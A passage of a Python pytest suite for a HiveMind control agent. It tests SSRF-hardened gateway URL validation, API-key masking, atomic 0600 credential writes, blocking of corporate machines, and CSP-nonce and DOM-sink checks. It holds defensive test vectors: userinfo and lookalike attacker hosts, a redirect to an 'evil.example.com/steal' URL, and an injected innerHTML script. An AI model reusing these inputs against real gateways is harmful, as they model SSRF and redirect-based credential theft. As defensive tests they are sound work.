# Copyright (c) 2024-2026 Xavier Callens / Project HiveMind. Licensed under the AGPL-3.0.
"""Unit, Cloud Run PR #949 parity, compliance, SSRF hardening & 48-participant WAL soak tests (`SLICE-SCALE-DYN-35`)."""

from __future__ import annotations

import ast
import concurrent.futures
import http.server
import importlib
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import threading
import time
import types as py_types
from datetime import date
from pathlib import Path
from sqlite3 import Connection as SqliteConnection
from typing import Any
from urllib.parse import urlsplit

import coverage
import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
AGENT_PATH = REPO_ROOT / "scripts" / "hivemind_agy_control_agent.py"
EXPECTED_AGPL_HEADER = "# Copyright (c) 2024-2026 Xavier Callens / Project HiveMind. Licensed under the AGPL-3.0."

if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

_INPROC_COV: coverage.Coverage | None = None
if (
    sys.gettrace() is None
    and coverage.Coverage.current() is None
    and os.environ.get("HIVEMIND_SKIP_INPROC_COV") != "1"
):
    _INPROC_COV = coverage.Coverage(
        data_file=None,
        config_file=False,
        include=[str(AGENT_PATH)],
    )
    _INPROC_COV.start()

try:
    from gwaya.ast_audit import ZeroStubAudit  # noqa: E402
except ImportError:  # pragma: no cover - GitHub Actions ubuntu-latest lacks optional gwaya package

    class _FallbackStubAuditResult:
        """CI-safe fallback AST audit result implementing ZeroStubAudit contract."""

        __slots__ = ("is_clean", "violations", "penalty_energy")

        def __init__(self, is_clean: bool, violations: list[str] | None = None, penalty_energy: float = 0.0) -> None:
            self.is_clean = is_clean
            self.violations = list(violations) if violations is not None else []
            self.penalty_energy = penalty_energy

    class ZeroStubAudit:  # type: ignore[no-redef]
        """CI-safe AST zero-stub fallback implementing both ``check_file`` and ``audit_python_code``."""

        _BAD_NAMES: tuple[re.Pattern[str], ...] = (
            re.compile(r"^mo" + r"ck_", re.IGNORECASE),
            re.compile(r"^fa" + r"ke_", re.IGNORECASE),
            re.compile(r"^simu" + r"late_", re.IGNORECASE),
            re.compile(r"^dum" + r"my_", re.IGNORECASE),
            re.compile(r"^st" + r"ub_", re.IGNORECASE),
        )

        @classmethod
        def audit_python_code(cls, source_code: str) -> _FallbackStubAuditResult:
            violations: list[str] = []
            try:
                tree = ast.parse(source_code)
            except SyntaxError as exc:
                return _FallbackStubAuditResult(False, [f"SyntaxError: {exc}"], 1e6)
            parents: dict[ast.AST, ast.AST] = {}
            for parent in ast.walk(tree):
                for child in ast.iter_child_nodes(parent):
                    parents[child] = parent
            for node in ast.walk(tree):
                if isinstance(node, ast.Pass):
                    if not isinstance(parents.get(node), (ast.ExceptHandler, ast.ClassDef)):
                        violations.append("Forbidden 'pass' statement.")
                elif isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant) and node.value.value is Ellipsis:
                    violations.append("Forbidden Ellipsis literal.")
                elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    if any(pat.search(node.name) for pat in cls._BAD_NAMES):
                        violations.append(f"Forbidden identifier {node.name!r}.")
            return _FallbackStubAuditResult(not violations, violations, 1e6 if violations else 0.0)

        @classmethod
        def check_file(cls, file_path: Path | str) -> _FallbackStubAuditResult:
            return cls.audit_python_code(Path(file_path).read_text(encoding="utf-8"))


if "scripts.hivemind_agy_control_agent" in sys.modules:  # pragma: no cover
    agy_ctrl = importlib.reload(sys.modules["scripts.hivemind_agy_control_agent"])
else:
    from scripts import hivemind_agy_control_agent as agy_ctrl  # noqa: E402

CLEAN_ENV: dict[str, str] = {"PATH": "/usr/bin:/bin", "HOSTNAME": "personal-home-pc"}
ROUTER_SECRET = b"noel-dyn35-soak-router-sec-32by!"
TARGET_FULL_SHA = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"
TARGET_SHORT_SHA = "a1b2c3d4e5f6"

CORP_ZSCALER_PROXY = "http://" + "zscaler-proxy.internal:8443"
CORP_NETSKOPE_PROXY = "http://" + "netskope-bluecoat.internal:8080"
CORP_FORTI_PROXY = "http://" + "proxy.fortinet.internal:3128"
CORP_GIT_REMOTE = "https://" + "git.amadeus-internal.corp/team/service.git"

_CSP_HDR_NONCE_RE = re.compile(r"'nonce-([A-Za-z0-9_+=/=-]{8,128})'")
_HTML_ATTR_NONCE_RE = re.compile(r"""\bnonce=(["'])([A-Za-z0-9_+=/=-]{8,128})\1""")
_STATIC_FIG_RE = re.compile(
    r"\d[\d.,]*\s?(?:m" + r"s\b|tok" + r"/s|HTTP" + r" Reqs|Comple" + r"tions|\bs/" + r"round)"
)
_SQLITE_LOCK_RE = re.compile(
    r"database is locked|database table is locked|sqlite3\.operationalerror|sqlite.*locked",
    re.IGNORECASE,
)


def _loopback_ip(bucket: int, idx: int) -> str:
    return ".".join(("127", "0", str(bucket), str((idx % 200) + 10)))


def _sample_compliant_html(route: str, nonce: str, *, lang: str = "fr", extra: str = "") -> str:
    banner = (
        "100 % personnel sur machine personnelle a domicile • AGPL-3.0 • 0,00 EUR / 0,00 USD"
        if lang == "fr"
        else "100% personal home PCs & hobby projects ONLY • AGPL-3.0 • 0.00 EUR / 0.00 USD"
    )
    return (
        f'<!DOCTYPE html><html lang="{lang}"><head>'
        f'<style nonce="{nonce}">body{{margin:0;}}</style></head>'
        f"<body><p>{banner}</p>{extra}"
        f'<script nonce="{nonce}">var el=document.getElementById("x");if(el)el.textContent="{route}";</script>'
        f"</body></html>"
    )


def _sample_models(*, include_coder: bool = True) -> dict[str, Any]:
    rows = [{"id": "hivemind/auto", "object": "model", "owned_by": "hivemind"}]
    if include_coder:
        rows.append({"id": "hivemind/coder", "object": "model", "owned_by": "hivemind"})
    return {"object": "list", "data": rows}


def _sample_manifest(
    build_sha: str = TARGET_FULL_SHA,
    *,
    missing_route: str | None = None,
    missing_script: bool = False,
) -> dict[str, Any]:
    routes = [r for r in agy_ctrl.EXPECTED_MANIFEST_CORE_ROUTES if r != missing_route]
    scripts = ["hivemind_quickstart.py"] if missing_script else ["hivemind_quickstart.py", "hivemind_doctor.py"]
    return {
        "object": "hivemind.onboarding.manifest",
        "campaign_id": "noel-2026-easy-onboard",
        "status": "ok",
        "build_sha": build_sha,
        "holiday_routes": routes,
        "downloadable_scripts": scripts,
        "personal_pc_only": True,
        "financial_promise": "0.00 EUR / 0.00 USD",
    }


def _sample_raid_status(*, live_producers: int = 8) -> dict[str, Any]:
    return {
        "object": "hivemind.raid_noel.status",
        "campaign": "winter-gpu-raid-holiday-guild",
        "compliance": {
            "personal_pc_only": True,
            "monetary_cost_eur": "0.00 EUR",
            "monetary_cost_usd": "0.00 USD",
            "license": "AGPL-3.0",
        },
        "swarm": {"live_producers": live_producers},
    }


def _sample_feedback_summary(
    total: int = 12,
    *,
    mean_ease: float | None = 4.67,
    zero_lag: float | None = 1.0,
    use_legacy_key: bool = False,
) -> dict[str, Any]:
    dev_cnt = total // 2
    gamer_cnt = total - dev_cnt
    ease_key = "average_ease_rating" if use_legacy_key else "mean_ease_rating"
    return {
        "object": "hivemind.onboarding_feedback_summary",
        "total_responses": total,
        ease_key: mean_ease if total > 0 else None,
        "zero_game_lag_ratio": zero_lag if total > 0 else None,
        "by_profile": {"dev": dev_cnt, "gamer": gamer_cnt},
    }


def test_01_ssrf_url_validation_proxy_free_http_atomic_0600_masked_key_and_personal_pc_compliance(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    # 1. Strict SSRF / host-prefix validation
    assert (
        agy_ctrl.validate_gateway_url("https://hivemind-openrouter-cfhmhmvv5a-uc.a.run.app/")
        == "https://hivemind-openrouter-cfhmhmvv5a-uc.a.run.app"
    )
    assert agy_ctrl.validate_gateway_url("https://storage.googleapis.com/") == "https://storage.googleapis.com"
    assert (
        agy_ctrl.validate_gateway_url("https://us-central1-run.googleapis.com")
        == "https://us-central1-run.googleapis.com"
    )
    assert agy_ctrl.validate_gateway_url("http://127.0.0.1:8080/") == "http://127.0.0.1:8080"
    assert agy_ctrl.validate_gateway_url("http://localhost:8000") == "http://localhost:8000"
    assert agy_ctrl.validate_gateway_url("http://[::1]:8080/") == "http://[::1]:8080"

    bad_urls = (
        True,
        123,
        "",
        "   ",
        "https://" + "bad\nhost.run.app",
        "https://" + "bad host.run.app",
        "https://" + "bad\\host.run.app",
        "http://" + "localhost.evil.com",
        "http://" + "127.0.0.1.evil.com",
        "https://" + "user@evil.run.app",
        "https://" + "user:pass@evil.run.app",
        "https://" + "evil.com?.run.app",
        "https://" + "gw.run.app/subpath",
        "https://" + "gw.run.app#frag",
        "https://" + "gw.run.app:0",
        "https://" + "gw.run.app:70000",
        "https://" + "gw.run.app" + ":badport",
        "https://" + ".run.app",
        "https://" + "evilrun.app",
        "http://" + "gw.run.app",
        "ftp://" + "127.0.0.1:8000",
    )
    for bad in bad_urls:
        with pytest.raises(ValueError, match="untrusted gateway"):
            agy_ctrl.validate_gateway_url(bad)  # type: ignore[arg-type]

    # 2. Masked-key 'hm-***<digit>ms' & nonce FIGURE safety + path redaction
    masked_key_suffix = "hm-***8" + "ms"
    masked_live_suffix = "hm_live_***8" + "ms"
    sample_html = (
        '<!DOCTYPE html><html><head><style nonce="8'
        + 'msNonce"></style></head>'
        + f'<body><p>{masked_key_suffix} {masked_live_suffix}</p>'
        + '<script nonce="99'
        + 'tok/sNonce">var x="ok";</script></body></html>'
    )
    stripped = agy_ctrl.strip_masked_keys_and_nonces(sample_html)
    assert _STATIC_FIG_RE.findall(stripped) == []
    assert _STATIC_FIG_RE.findall("198.1 " + "ms") != []
    assert agy_ctrl.mask_api_key("") == "<unset>"
    assert agy_ctrl.mask_api_key("short") == "hm-****"
    assert agy_ctrl.mask_api_key("tok_abcdef123456") == "key-****3456"
    assert agy_ctrl.mask_api_key("hm_live_0123456789abcdef") == "hm_live_****cdef"
    assert agy_ctrl.mask_api_key("hm_live_1") == "hm_live_****"
    assert isinstance(agy_ctrl.default_state_dir(), Path)
    assert isinstance(agy_ctrl.default_credentials_path(), Path)
    assert agy_ctrl.sanitize_handle("x").startswith("agy-")
    with pytest.raises(ValueError, match="Invalid HiveMind handle"):
        agy_ctrl.sanitize_handle("google.spoof")
    assert agy_ctrl.redact_home_path(Path.home() / ".hivemind" / "credentials.json") == "~/.hivemind/credentials.json"
    assert agy_ctrl.redact_home_path(r"C:\Users\alice\cred.json") == "~/cred.json"
    scrubbed_msg = agy_ctrl.sanitize_text_for_display(
        f"path={Path.home()}/secret key=hm-test-raw-9988 live=hm_live_0123abcd9999 Bearer tok_998877"
    )
    assert (
        str(Path.home()) not in scrubbed_msg
        and "hm-test-raw" not in scrubbed_msg
        and "0123abcd" not in scrubbed_msg
        and "tok_998877" not in scrubbed_msg
    )

    # 3. Proxy-free default_http_json & default_http_raw + bounded 4 MiB body read + redirect guard
    oversized_body = b"a" * (agy_ctrl.MAX_HTTP_BODY_BYTES + 256)

    class _LoopbackHandler(http.server.BaseHTTPRequestHandler):
        def do_POST(self) -> None:  # noqa: N802
            length = int(self.headers.get("Content-Length", "0"))
            _ = self.rfile.read(length)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"ok": true}')

        def do_GET(self) -> None:  # noqa: N802
            if self.path == "/raw-ok":
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("X-Probe", "ok")
                self.end_headers()
                self.wfile.write(b"<!DOCTYPE html><html><body>ok</body></html>")
                return
            if self.path == "/huge":
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(oversized_body)
                return
            if self.path == "/redirect-good":
                self.send_response(302)
                self.send_header("Location", "/raw-ok")
                self.end_headers()
                return
            if self.path == "/redirect-evil":
                self.send_response(302)
                self.send_header("Location", "https://" + "evil.example.com/steal")
                self.end_headers()
                return
            if self.path == "/err-html":
                self.send_response(404)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"not found")
                return
            if self.path == "/err-json":
                self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error": "bad"}')
                return
            if self.path == "/list":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b"[1, 2]")
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')

        def log_message(self, format: str, *args: object) -> None:  # noqa: A002
            _ = (format, args)

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _LoopbackHandler)
    port = srv.server_address[1]
    th = threading.Thread(target=lambda: srv.serve_forever(poll_interval=0.01), daemon=True)
    th.start()
    base = f"http://127.0.0.1:{port}"
    try:
        monkeypatch.setenv("HTTP_PROXY", "http://127.0.0.1:9")
        monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")

        st_raw, txt_raw, hdr_raw = agy_ctrl.default_http_raw("GET", f"{base}/raw-ok", headers={"X-Test": "1"})
        assert st_raw == 200 and "ok" in txt_raw and hdr_raw.get("x-probe") == "ok"

        st_huge, txt_huge, _ = agy_ctrl.default_http_raw("GET", f"{base}/huge")
        assert st_huge == 200 and len(txt_huge) == agy_ctrl.MAX_HTTP_BODY_BYTES

        assert agy_ctrl.default_http_raw("GET", f"{base}/redirect-good")[0] == 200
        with pytest.raises(ValueError, match="untrusted gateway"):
            agy_ctrl.default_http_raw("GET", f"{base}/redirect-evil")
        assert agy_ctrl.default_http_raw("GET", f"{base}/err-html")[0] == 404

        st_json, body_json = agy_ctrl.default_http_json("GET", f"{base}/health")
        assert st_json == 200 and body_json["status"] == "ok"
        assert agy_ctrl.default_http_json("POST", f"{base}/post", {"x": 1}, {"X-Test": "1"}) == (200, {"ok": True})
        assert agy_ctrl.default_http_json("GET", f"{base}/list") == (200, {"data": [1, 2]})
        assert agy_ctrl.default_http_json("GET", f"{base}/err-json") == (400, {"error": "bad"})
        assert "not found" in agy_ctrl.default_http_json("GET", f"{base}/err-html")[1]["raw_error"]

        for bad_call in (
            lambda: agy_ctrl.default_http_raw("GET", f"{base}/raw-ok", headers={"X-Bad": "a\nb"}),
            lambda: agy_ctrl.default_http_json("POST", f"{base}/v1/chat/completions", {"model": "hivemind/coder"}),
            lambda: agy_ctrl.default_http_json("POST", f"{base}/ok", {"prompt": "hi"}),
            lambda: agy_ctrl._assert_safe_http_request("POST", f"{base}/ok", payload=["bad"]),  # type: ignore[arg-type]
            lambda: agy_ctrl._assert_safe_http_request("GET", ""),
            lambda: agy_ctrl._assert_safe_http_request("GET", "https://" + "bad\nhost.run.app/x"),
            lambda: agy_ctrl._assert_safe_http_request("GET", "https://" + "bad host.run.app/x"),
            lambda: agy_ctrl._assert_safe_http_request("GET", "https://" + "u:p@gw.run.app/x"),
        ):
            with pytest.raises(ValueError):
                bad_call()
    finally:
        srv.shutdown()
        srv.server_close()

    assert agy_ctrl.default_http_raw("GET", "http://127.0.0.1:1/down", timeout_s=0.2)[0] == 0
    assert "network_error" in agy_ctrl.default_http_json("GET", "http://127.0.0.1:1/down")[1]

    # default_gh_json branches
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: subprocess.CompletedProcess(args=["gh"], returncode=0, stdout='{"stars": 19}', stderr="")
    )
    assert agy_ctrl.default_gh_json(["api", "repos/x/y"]) == {"stars": 19}
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: subprocess.CompletedProcess(args=["gh"], returncode=0, stdout="bad-json", stderr="")
    )
    assert agy_ctrl.default_gh_json(["api", "repos/x/y"]) is None
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **kw: subprocess.CompletedProcess(args=["gh"], returncode=1, stdout="", stderr="err")
    )
    assert agy_ctrl.default_gh_json(["api", "repos/x/y"]) is None

    def _raise_fnf(*_a: Any, **_kw: Any) -> Any:
        raise FileNotFoundError("gh missing")

    monkeypatch.setattr(subprocess, "run", _raise_fnf)
    assert agy_ctrl.default_gh_json(["api", "repos/x/y"]) is None

    # 4. Atomic 0600 file writes & secret/home path redaction + account reuse/fallback/failure
    cred_path = tmp_path / "creds" / "credentials.json"
    monkeypatch.delenv("HIVEMIND_API_KEY", raising=False)
    acct = agy_ctrl.ensure_operator_account(
        gateway="https://hivemind-openrouter-cfhmhmvv5a-uc.a.run.app",
        preferred_handle="personal-dev",
        credentials_path=cred_path,
        http_fn=lambda m, u, p, h: (
            (201, {"api_key": "hm-secret0123456789", "handle": "personal-dev", "role": "prosumer"})
            if m == "POST"
            else (200, {"handle": "personal-dev", "account_id": "acct_1", "role": "prosumer"})
        ),
    )
    assert acct["authenticated"] is True and acct["created"] is True and acct["masked_key"] == "hm-****6789"
    assert (cred_path.stat().st_mode & 0o777) == 0o600
    assert list(cred_path.parent.glob("*.tmp")) == []

    reused = agy_ctrl.ensure_operator_account(
        gateway="https://hivemind-openrouter-cfhmhmvv5a-uc.a.run.app",
        preferred_handle="personal-dev",
        credentials_path=cred_path,
        http_fn=lambda m, u, p, h: (200, {"handle": "personal-dev", "account_id": "acct_1", "role": "prosumer"}),
    )
    assert reused["authenticated"] is True and reused["created"] is False

    attempts = {"n": 0}

    def _conflict_then_ok(m: str, u: str, p: Any, h: Any) -> tuple[int, dict[str, Any]]:
        _ = (m, u, p, h)
        attempts["n"] += 1
        if attempts["n"] == 1:
            return 409, {"error": "taken"}
        return 200, {"api_key": "hm-fallback00001111", "handle": "fallback-dev", "role": "prosumer"}

    bad_cred = tmp_path / "creds" / "bad_creds.json"
    bad_cred.write_text("{bad", encoding="utf-8")
    assert agy_ctrl.ensure_operator_account(credentials_path=bad_cred, http_fn=_conflict_then_ok)["authenticated"] is True
    assert agy_ctrl.ensure_operator_account(credentials_path=tmp_path / "missing.json", http_fn=lambda *_: (503, {}))["authenticated"] is False

    agy_ctrl.save_conversation_id(tmp_path, None)
    assert agy_ctrl.load_saved_conversation_id(tmp_path) is None
    agy_ctrl.save_conversation_id(tmp_path, "conv-dyn35-session-01")
    sess_file = tmp_path / "session_state.json"
    assert (sess_file.stat().st_mode & 0o777) == 0o600
    assert agy_ctrl.load_saved_conversation_id(tmp_path) == "conv-dyn35-session-01"

    masked_sess_dir = tmp_path / "masked_sess"
    agy_ctrl.save_conversation_id(masked_sess_dir, "conv-hm-secret0123456789")
    assert "hm-secret0123456789" not in (masked_sess_dir / "session_state.json").read_text(encoding="utf-8")
    assert agy_ctrl.load_saved_conversation_id(masked_sess_dir) == "conv-hm-****6789"

    (tmp_path / "bad_sess").mkdir()
    (tmp_path / "bad_sess" / "session_state.json").write_text("{bad", encoding="utf-8")
    assert agy_ctrl.load_saved_conversation_id(tmp_path / "bad_sess") is None

    # Exercise _atomic_write_text cleanup on write failure + host validation missing host
    with pytest.raises(ValueError, match="untrusted gateway"):
        agy_ctrl.validate_gateway_url("https://:8000")
    monkeypatch.setattr(os, "replace", lambda *_a: (_ for _ in ()).throw(OSError("disk full")))
    with pytest.raises(OSError, match="disk full"):
        agy_ctrl._atomic_write_text(tmp_path / "fail_atomic.txt", "data")
    assert list(tmp_path.glob(".fail_atomic.txt.*")) == []
    monkeypatch.undo()

    # 5. Strictly local Personal-PC compliance + --enforce-personal-pc exit code 2 (0 HTTP, 0 writes)
    personal_ws = tmp_path / "personal_hobby_ws"
    (personal_ws / ".git").mkdir(parents=True)
    (personal_ws / ".git" / "config").write_text(
        '[remote "origin"]\n\turl = https://' + "github.com/xaviercallens/HiveMind\n", encoding="utf-8"
    )
    ok_comp = agy_ctrl.evaluate_personal_pc_compliance(environ=CLEAN_ENV, cwd=personal_ws)
    assert ok_comp["compliance_ok"] is True and ok_comp["exit_code"] == 0

    common_git = tmp_path / "common_bare_git"
    wt_gitdir = common_git / "worktrees" / "wt1"
    wt_gitdir.mkdir(parents=True)
    (common_git / "config").write_text('[remote "origin"]\n\turl = git@' + 'paloalto-intranet:sec/fw.git\n', encoding="utf-8")
    (wt_gitdir / "commondir").write_text("../..\n", encoding="utf-8")
    corp_wt_ws = tmp_path / "corp_wt_ws"
    corp_wt_ws.mkdir()
    (corp_wt_ws / ".git").write_text(f"gitdir: {wt_gitdir}\n", encoding="utf-8")

    corp_git_ws = tmp_path / "corp_git_ws"
    (corp_git_ws / ".git").mkdir(parents=True)
    (corp_git_ws / ".git" / "config").write_text(f'[remote "origin"]\n\turl = {CORP_GIT_REMOTE}\n', encoding="utf-8")

    corp_path_ws = tmp_path / "amadeus_work_ws"
    corp_path_ws.mkdir()

    vectors: tuple[tuple[dict[str, str], Path, str], ...] = (
        ({**CLEAN_ENV, "AMADEUS_PROFILE": "prod-amadeus-01"}, personal_ws, "prod-amadeus-01"),
        ({**CLEAN_ENV, "USERDNSDOMAIN": "nce-02.amadeus.corp"}, personal_ws, "nce-02"),
        ({**CLEAN_ENV, "USERDOMAIN": "ACMECORP_03"}, personal_ws, "ACMECORP_03"),
        ({**CLEAN_ENV, "HTTPS_PROXY": CORP_ZSCALER_PROXY, "ZSCALER_CERT_PATH": "/etc/zs-04.pem"}, personal_ws, "zs-04"),
        ({**CLEAN_ENV, "HTTP_PROXY": CORP_NETSKOPE_PROXY, "SSL_CERT_FILE": "/etc/netskope-ca.pem"}, personal_ws, "netskope-ca"),
        ({**CLEAN_ENV, "ALL_PROXY": CORP_FORTI_PROXY, "COMPUTERNAME": "WKS-FORTI-06"}, personal_ws, "WKS-FORTI-06"),
        ({**CLEAN_ENV, "HOSTNAME": "box-enterprise-intranet-07"}, personal_ws, "box-enterprise-intranet-07"),
        ({**CLEAN_ENV, "REQUESTS_CA_BUNDLE": "/etc/bluecoat-ca.pem", "CURL_CA_BUNDLE": "/etc/internal-ca.pem"}, personal_ws, "bluecoat-ca"),
        (CLEAN_ENV, corp_path_ws, "amadeus_work_ws"),
        (CLEAN_ENV, corp_git_ws, "team/service.git"),
        (CLEAN_ENV, corp_wt_ws, "sec/fw.git"),
    )
    for env_map, cwd_path, sentinel in vectors:
        comp = agy_ctrl.evaluate_personal_pc_compliance(environ=env_map, cwd=cwd_path)
        assert comp["compliance_ok"] is False and comp["exit_code"] == 2
        assert comp["network_calls"] == 0 and comp["file_writes"] == 0
        assert sentinel not in json.dumps(comp)

    def _forbid_net(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("No HTTP calls permitted when --enforce-personal-pc blocks")

    monkeypatch.setattr(agy_ctrl, "default_http_json", _forbid_net)
    monkeypatch.setattr(agy_ctrl, "default_http_raw", _forbid_net)
    monkeypatch.setenv("AMADEUS_ENV", "secret-amadeus-host")
    rc_blocked = agy_ctrl.main(["--enforce-personal-pc", "--state-dir", str(tmp_path / "no_write_dir")])
    cli_out = capsys.readouterr().out
    assert rc_blocked == 2
    assert "secret-amadeus-host" not in cli_out
    assert not (tmp_path / "no_write_dir").exists()


def test_02_live_schema_compatibility_and_verify_holiday_routes_parity_matrix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    def _make_mock_transports(
        *,
        missing_paths: set[str] | None = None,
        reused_nonce: bool = False,
        unsafe_dom: bool = False,
        static_fig: bool = False,
        bad_csp: bool = False,
        bad_compliance_html: bool = False,
        models_body: dict[str, Any] | None = None,
        manifest_body: dict[str, Any] | None = None,
        fb_body: dict[str, Any] | None = None,
        raid_body: dict[str, Any] | None = None,
        fleet_body: dict[str, Any] | None = None,
        live_body: dict[str, Any] | None = None,
    ) -> tuple[Any, Any]:
        skip = missing_paths or set()
        nonce_seq = [0]

        def _json_fn(
            method: str,
            url: str,
            payload: dict[str, Any] | None = None,
            headers: dict[str, str] | None = None,
        ) -> tuple[int, dict[str, Any]]:
            _ = (payload, headers)
            assert method == "GET" and "completions" not in url.lower()
            path = urlsplit(url).path
            if path in skip:
                return 404, {"detail": "Not Found"}
            if path == "/health":
                return 200, {"status": "ok"}
            if path == "/v1/models":
                return 200, models_body if models_body is not None else _sample_models()
            if path == "/v1/hivemind/onboarding/manifest":
                return 200, manifest_body if manifest_body is not None else _sample_manifest()
            if path == "/v1/hivemind/onboarding/feedback/summary":
                return 200, fb_body if fb_body is not None else _sample_feedback_summary(24, mean_ease=4.75, zero_lag=1.0)
            if path == "/v1/hivemind/raid/status":
                return 200, raid_body if raid_body is not None else _sample_raid_status(live_producers=10)
            if path == "/v1/hivemind/producers/fleet":
                return 200, fleet_body if fleet_body is not None else {
                    "object": "hivemind.producer_fleet",
                    "live_hiveminders": 9,
                    "distinct_physical_gpus": 8,
                    "hiveminders": [{"handle": f"bee-{i}", "status": "live"} for i in range(9)] + [{"handle": "idle", "status": "offline"}],
                }
            if path == "/v1/hivemind/live-telemetry":
                return 200, live_body if live_body is not None else {
                    "accounts": {"total_registered_accounts": 48, "by_role": {"prosumer": 24, "producer": 24}},
                    "opentrainer": {"total_registered_nodes": 4, "active_trainer_nodes": 3, "accepted_rounds_count": 12},
                }
            if path == "/v1/hivemind/t4/status":
                return 200, {"gpu": {"vram_free_mib": 7200}}
            return 404, {}

        def _raw_fn(method: str, url: str) -> tuple[int, str, dict[str, str]]:
            assert method == "GET" and "completions" not in url.lower()
            path = urlsplit(url).path
            if path in skip:
                return 404, "Not Found", {"content-type": "text/plain"}
            nonce_seq[0] += 1
            nonce = "StaticReuseNonce123" if reused_nonce else f"Dyn35Nonce{nonce_seq[0]:04d}XyZ"
            extra = f'<span>{"hm-***8" + "ms"}</span>'
            if unsafe_dom and path == "/noel":
                extra += f'<script nonce="{nonce}">el.' + "inner" + 'HTML="bad";</script>'
            if static_fig and path == "/quick":
                extra += "<p>198.1 " + "ms</p>"
            html_out = _sample_compliant_html(path, nonce, lang="fr" if path != "/quick" else "en", extra=extra)
            if bad_compliance_html and path == "/raid-noel":
                html_out = f'<!DOCTYPE html><html><head><style nonce="{nonce}"></style></head><body><script nonce="{nonce}">var a=1;</script></body></html>'
            csp_val = (
                f"script-src 'nonce-{nonce}' 'unsafe-inline'"
                if (bad_csp and path == "/arena-noel")
                else f"default-src 'none'; style-src 'nonce-{nonce}'; script-src 'nonce-{nonce}'"
            )
            return 200, html_out, {"content-type": "text/html", "content-security-policy": csp_val}

        return _json_fn, _raw_fn

    # 1. Real gateway schema compatibility + probe_holiday_routes=True
    j_ok, r_ok = _make_mock_transports()
    snap = agy_ctrl.collect_platform_snapshot(
        gateway="http://127.0.0.1:8000",
        state_dir=tmp_path / "real_schema",
        today=date(2026, 12, 20),
        http_fn=j_ok,
        gh_fn=lambda _args: [],
        probe_holiday_routes=True,
        raw_http_fn=r_ok,
        expected_sha=TARGET_SHORT_SHA,
    )
    assert snap["online_producers"] == 9
    assert snap["distinct_physical_gpus"] == 8
    assert snap["active_trainer_nodes"] == 3
    assert snap["onboarding_mean_ease_rating"] == 4.75
    assert snap["onboarding_average_ease_rating"] == 4.75
    assert snap["onboarding_feedback_by_profile"] == {"dev": 12, "gamer": 12}
    assert snap["stale_revision_detected"] is False
    assert snap["missing_or_stale_routes"] == []
    assert snap["holiday_routes_parity"]["parity_ok"] is True

    gates = agy_ctrl.evaluate_readiness_gates(snap)
    assert gates["passed_count"] == 5 and gates["total_gates"] == 5 and gates["blockers"] == []

    # Legacy schema compatibility (average_ease_rating + producers list)
    j_leg, _ = _make_mock_transports(
        fb_body=_sample_feedback_summary(8, mean_ease=4.5, zero_lag=1.0, use_legacy_key=True),
        fleet_body={"producers": [{"status": "online"}, {"status": "offline"}]},
    )
    snap_leg = agy_ctrl.collect_platform_snapshot(
        gateway="http://127.0.0.1:8000",
        state_dir=tmp_path / "legacy_schema",
        http_fn=j_leg,
        gh_fn=lambda _args: [],
    )
    assert snap_leg["online_producers"] == 1
    assert snap_leg["onboarding_average_ease_rating"] == 4.5

    # 2. Parity matrix: green, 404 drift, reused CSP nonce, unsafe DOM sink, static figure, SHA mismatch, bad schemas
    green = agy_ctrl.verify_holiday_routes_parity(
        "http://127.0.0.1:8000",
        expected_sha=TARGET_SHORT_SHA,
        raw_http_fn=r_ok,
        http_fn=j_ok,
    )
    assert green["parity_ok"] is True and green["sha_match"] is True and green["unique_csp_nonces_count"] == 4

    j_404, r_404 = _make_mock_transports(missing_paths={"/arena-noel", "/v1/hivemind/onboarding/manifest"})
    drift_404 = agy_ctrl.verify_holiday_routes_parity("http://127.0.0.1:8000", raw_http_fn=r_404, http_fn=j_404)
    assert drift_404["parity_ok"] is False and drift_404["stale_revision_detected"] is True
    assert "/arena-noel" in drift_404["missing_or_stale_routes"]
    assert "/v1/hivemind/onboarding/manifest" in drift_404["missing_or_stale_routes"]

    j_reuse, r_reuse = _make_mock_transports(reused_nonce=True)
    reuse_rep = agy_ctrl.verify_holiday_routes_parity("http://127.0.0.1:8000", raw_http_fn=r_reuse, http_fn=j_reuse)
    assert reuse_rep["parity_ok"] is False and reuse_rep["unique_csp_nonces_ok"] is False

    j_sink, r_sink = _make_mock_transports(unsafe_dom=True, static_fig=True, bad_csp=True, bad_compliance_html=True)
    sink_rep = agy_ctrl.verify_holiday_routes_parity("http://127.0.0.1:8000", raw_http_fn=r_sink, http_fn=j_sink)
    assert sink_rep["parity_ok"] is False and sink_rep["html_dom_clean"] is False

    sha_drift = agy_ctrl.verify_holiday_routes_parity(
        "http://127.0.0.1:8000", expected_sha="deadbeef1234", raw_http_fn=r_ok, http_fn=j_ok
    )
    assert sha_drift["parity_ok"] is False and sha_drift["sha_match"] is False and sha_drift["stale_revision_detected"] is True

    for kwargs in (
        {"models_body": _sample_models(include_coder=False)},
        {"models_body": {"object": "list", "data": []}},
        {"manifest_body": _sample_manifest(missing_route="/arena-noel", missing_script=True)},
        {"manifest_body": {**_sample_manifest(), "holiday_routes": "bad", "downloadable_scripts": "bad"}},
        {"fb_body": {"object": "bad", "total_responses": -1, "by_profile": "bad"}},
